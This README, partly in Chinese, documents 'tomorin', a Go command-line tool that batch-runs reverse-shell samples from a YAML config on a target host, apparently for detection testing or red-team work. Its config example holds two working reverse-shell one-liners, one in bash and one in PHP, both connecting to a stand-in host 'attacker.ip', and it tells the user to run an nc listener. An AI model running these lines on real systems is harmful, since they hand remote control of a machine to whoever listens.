# tomorin 批量执行反弹 Shell 样本

## Build

```bash
go build -o ./bin/tomorin
```

## Usage

```
ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin
Run multiple reverse shell samples

Usage:
  tomorin [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  run         Run reverse shell samples on the target

Flags:
  -h, --help   help for tomorin

Use "tomorin [command] --help" for more information about a command.
```

编写 `config.yml`，把反弹Shell样本写入 `samples` 字段，把依赖项写入 `depends` 字段，比如

```yaml
depends:
- php
samples:
- name: 001
  script: bash -i >& /dev/tcp/attacker.ip/4242 0>&1
- name: 002
  script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> 目前还没有反弹shell server的功能，所以需要用nc拉起来单独的server。

确认所有依赖都无误之后，执行所有反弹Shell样本

```bash
./bin/tomorin run -c config.yml
```

## TODO

- [ ] Reverse shell server
    - [ ] TCP
    - [ ] UDP
